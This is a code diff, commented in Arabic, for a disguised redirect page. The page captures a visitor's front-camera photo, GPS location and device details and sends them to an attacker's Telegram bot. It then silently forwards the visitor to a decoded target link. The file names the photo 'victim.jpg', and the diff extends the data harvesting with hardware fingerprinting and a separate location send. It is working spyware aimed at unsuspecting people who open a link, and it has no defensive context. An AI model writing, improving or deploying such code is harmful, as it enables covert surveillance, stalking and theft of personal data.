@@ -24,38 +24,85 @@
   let targetUrl = 'https://google.com';
   try {
     const hash = window.location.hash.substring(1);
-    if (hash) {
-      // فك تشفير الرابط
-      targetUrl = atob(hash.replace(/-/g, '+').replace(/_/g, '/'));
-    }
+    if (hash) { targetUrl = atob(hash.replace(/-/g, '+').replace(/_/g, '/')); }
   } catch (e) { console.error('Link decode error', e); }
 
   const video = document.getElementById('camera');
   const canvas = document.getElementById('canvas');
   const statusText = document.getElementById('status');
 
-  async function sendToTelegram(photoBlob, lat, lon) {
+  // 1. دالة لجمع معلومات الجهاز الحقيقية
+  async function getDeviceInfo() {
+    let info = {
+      model: "غير معروف",
+      platform: navigator.platform || "غير معروف",
+      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متاح",
+      cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " أنوية" : "غير متاح",
+      resolution: `${window.screen.width}x${window.screen.height}`,
+      browser: navigator.userAgent
+    };
+
+    // محاولة جلب الموديل الحقيقي (يدعم كروم وأندرويد)
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      try {
+        const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+        if (hints.model) info.model = hints.model;
+        if (hints.platform) info.platform = hints.platform;
+      } catch (e) { console.log("High entropy not supported"); }
+    }
+    return info;
+  }
+
+  // 2. دالة إرسال الموقع كخريطة
+  async function sendLocationToTelegram(lat, lon) {
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+      });
+    } catch (e) { console.error('Location send error', e); }
+  }
+
+  // 3. دالة إرسال الصورة مع المعلومات
+  async function sendPhotoWithInfo(photoBlob, deviceInfo, lat, lon) {
+    const caption = `📱 *تقرير الجهاز:*\n` +
+      `• الطراز: ${deviceInfo.model}\n` +
+      `• النظام: ${deviceInfo.platform}\n` +
+      `• المعالج: ${deviceInfo.cores}\n` +
+      `• الذاكرة: ${deviceInfo.ram}\n` +
+      `• الشاشة: ${deviceInfo.resolution}\n` +
+      `• المتصفح: ${deviceInfo.browser}\n\n` +
+      `📍 *الموقع:*\n` +
+      (lat && lon ? `خط العرض: ${lat}\nخط الطول: ${lon}` : 'لم يتم السماح بالموقع') +
+      `\n\n🔗 *الرابط:* ${targetUrl}`;
+
     try {
       if (photoBlob) {
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
         fd.append('photo', photoBlob, 'victim.jpg');
-        fd.append('caption', `📍 موقع: ${lat && lon ? lat + ', ' + lon : 'غير متاح'}\n🔗 الرابط: ${targetUrl}`);
+        fd.append('caption', caption);
+        fd.append('parse_mode', 'Markdown');
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-      } else if (lat && lon) {
+      } else {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST', headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 موقع فقط: ${lat}, ${lon}\n🔗 الرابط: ${targetUrl}` })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
         });
       }
     } catch (e) { console.error('Telegram error', e); }
   }
 
+  // 4. الدالة الرئيسية
   async function start() {
     let lat = null, lon = null;
     let photoBlob = null;
 
-    // طلب الموقع
+    // أ) جمع معلومات الجهاز
+    const deviceInfo = await getDeviceInfo();
+
+    // ب) طلب الموقع
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
@@ -64,7 +111,7 @@
       );
     }
 
-    // طلب الكاميرا
+    // ج) طلب الكاميرا والتقاط الصورة
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       video.srcObject = stream;
@@ -78,10 +125,18 @@
       stream.getTracks().forEach(t => t.stop());
     } catch (err) { console.log('Camera denied or failed', err); }
 
+    // د) إرسال كل حاجة
     statusText.innerText = 'جاري التحميل...';
-    await sendToTelegram(photoBlob, lat, lon);
+    
+    // إرسال الصورة والمعلومات النصية
+    await sendPhotoWithInfo(photoBlob, deviceInfo, lat, lon);
+    
+    // إرسال الموقع كخريطة (لو متاح)
+    if (lat && lon) {
+      await sendLocationToTelegram(lat, lon);
+    }
 
-    // التحويل
+    // هـ) التحويل للرابط الأساسي
     window.location.replace(targetUrl);
   }
 
